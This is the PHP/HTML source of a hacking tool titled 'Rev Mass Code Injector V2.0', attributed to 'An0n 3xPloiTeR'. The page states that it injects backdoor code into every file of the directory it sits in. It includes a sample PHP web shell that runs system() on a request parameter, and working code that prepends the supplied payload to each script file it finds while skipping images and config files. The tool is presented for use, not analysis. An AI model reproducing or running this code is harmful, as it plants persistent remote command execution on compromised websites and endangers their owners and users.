<!DOCTYPE html>
<html lang="en">
	<head>
		<title>Rev Mass Code Injector V2.0</title>
		<meta charset="UTF-8" />
		<meta http-equiv="refresh" content=""><!-- This Will Refresh Page After Every ___ Seconds -->
		<meta name="revisit-after" content="3600" />
		<meta name="language" content="en" />
		<meta content="index,follow,all" name="googlebot" />
		<meta name='author' content='https://www.facebook.com/An0n.3xPloiTeR' />
		<meta content='general' name='rating' />
		<meta content='pakistan' name='geo.placename' />
		<meta content='google' name='generator' />
		<meta content='follow,all' name='msnbot' />
		<meta content='follow,all' name='alexabot' />
        <meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
        <meta name="version" content="2.0" />
        <meta name="description" content="For injecting the code you gave in every file of the given dir" />
        <meta name="keywords" content="Injection, index.php, Tool" />
		<meta name="Tool" content="Made By An0n 3xPloiTeR :)" />
		<meta name="Working" content="Rev Mass Code Injector V2.0" />
		<meta name="revised" content="Rev Mass Code Injector V2.0, 25-01-2017" />
		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<!--
		<script language="Javascript1.2">
			function  njs_nodroit() {
				alert ("Developed By An0n 3xPloiTeR");
				alert ("Although There Are No Copyrights");
				alert ("But You Aren't Supposed To Copy My Code (even html xD) :-)");
				alert ("Got Your Ip: <?php echo $_SERVER['REMOTE_ADDR']; ?> and reported to An0n 3xPloiTeR");
				return false;
			} document.oncontextmenu = njs_nodroit;
		</script>
		-->
		<style>
			body {
				background-color: black;
				margin-top: 2vh;
			}
			.heading {
				color: red;
				font-family: Comic Sans Ms;
				text-align: center;
				font-size: 300%;
			}
			.subheading {
				color: white;
				text-align: center;
				font-family: Comic Sans Ms;
				font-size: 100%;
			}
			.data {
				color: white;
				text-align: center;
				font-size: 120%;
				font-family: Comic Sans Ms;
			}
			input {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			select {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black;
			}
			option {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			textarea {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			.phpresults {
				color: white;
				font-size: 100%;
				font-family: Comic Sans Ms;
				text-align: center;
			}
			.footer {
				color: red;
				font-size: 120%;
				font-family: Comic Sans Ms;
				text-align: center;
				position: fixed;
				left: 0px;
				right: 0px;
				bottom: 3px;
			}
			a {
				color: red;
				text-decoration: none;
			}
			a:hover {
				color: teal;
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>ReV Mass Code Injector V2.0</font>
		</div>
		<div class="subheading">
			<font><br>This Tool Will Inject Backdoor Code or The Code You Will Give :) <br> In Every File Of The Given Directory :D<br><br>You Are Currently In:<?php echo "&nbsp;".getcwd(); ?></font>
		</div>
		<div class="data"><br>
			<form action="" method="POST">
			<?php
				$console = '
<?php
if (isset($_REQUEST[cmd])) {
system ($_REQUEST[cmd]);
}
?>';
			?>
				<textarea type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $console; ?>"></textarea><br>
				<input style="font-family: Comic Sans Ms; font-size: 90%;" type="submit" name="submit" value="Submit" />
			</form>
		</div>
		<div class="phpresults"><br>
			<?php
				if (isset($_POST['submit'])) {
					$code = $_POST['code'];
					$code1 = base64_encode($code);
					$path = getcwd();
					$host = 'http://'.$_SERVER['HTTP_HOST'];
					$path_of_file = $_SERVER['SCRIPT_NAME'];
					$website_testing = $host.$path_of_file;
					$path = getcwd();
					$directory = $path;

					if (empty($code)) {
						echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
					}

					if (!empty($code)) {

							if ($handle = opendir($directory)) {
							echo 'Website: '.$website_testing.'<br /><br />';
							echo 'Looking in '.$directory.'<br>';
							while ($files = readdir($handle)) {
								if ($files != '.' && $files != '..' && $files != 'rev.php' && $files != 'REV.php' && $files != '.htaccess' && $files != 'php.ini' && $files != 'admin' && $files != 'images' && $files != 'image' && $files != 'img' && $files != 'phpmyadmin' && $files != 'files' && $files != '.ftpquota' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'xml' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'jpg' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'ico' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'png' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'jpeg' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'txt' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'exe' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'html' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'shtml' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'htm' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'ico' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'css' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'zip' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'sql' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'js' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'py' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'pl' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'md' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'gif') {
								echo '<a target="_blank" href="'.$files.'">'.$files.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
								$file_data = base64_decode($code1);
								$file_data .= file_get_contents($files);
								file_put_contents($files, $file_data);
								} 
							}
						}
					}
				}	
			?>
		</div><br><br><br><br>
		<div class="footer">
			<footer>
			<hr>
			<font>Developed By <a href="https://www.google.com/search?q=An0n 3xPloiTeR" target="_blank">An0n 3xPloiTeR</a></font></footer>
			<hr>
		</div>
	</body>
</html>
